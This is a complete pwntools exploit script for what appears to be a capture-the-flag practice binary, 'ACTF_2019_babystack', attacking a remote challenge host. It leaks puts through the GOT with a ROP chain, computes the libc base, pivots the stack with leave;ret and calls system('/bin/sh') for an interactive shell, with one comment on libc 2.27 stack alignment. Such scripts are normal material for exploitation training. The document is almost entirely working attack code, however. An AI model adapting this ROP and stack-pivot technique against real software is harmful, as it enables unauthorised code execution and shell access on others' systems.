from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

p = remote('node4.buuoj.cn', 29610)
e = ELF('./ACTF_2019_babystack')
libc = ELF('/home/leo/tools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')

leave_retn = 0x400a18
pop_rdi_ret = 0x400ad3
pop_rsi_r15_ret = 0x400ad1
pop_rbx_rbp_r12_r13_r14_15_retn = 0x400aca
ret = 0x400709
main_addr = 0x4008f6
p.sendlineafter(b'>', str(0xe0).encode())
p.recvuntil(b'Your message will be saved at ')
s_addr = int(p.recv(14).decode(), 16)

payload = p64(s_addr+0xd0)
payload += p64(pop_rdi_ret) + p64(e.got['puts'])
payload += p64(e.plt['puts'])
payload += p64(main_addr) # main: 0x4008f6
payload = payload.ljust(0xd0, b'a')
payload += p64(s_addr) + p64(leave_retn)

p.sendafter(b'>', payload)

# stack pivot again
puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
libc_base = puts_addr - libc.sym['puts']
system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
p.success(f"libc base: {hex(libc_base)}")

p.sendlineafter(b'>', str(0xe0).encode())
p.recvuntil(b'Your message will be saved at ')
s_addr = int(p.recv(14).decode(), 16)

payload2 = b'a'*8
payload2 += p64(pop_rdi_ret) + p64(binsh_addr)
payload2 += p64(ret) # libc 2.27 system 要求地址对齐0x10字节
payload2 += p64(system_addr)
payload2 = payload2.ljust(0xd0, b'a')
payload2 += p64(s_addr) + p64(leave_retn)
p.send(payload2)

p.interactive()
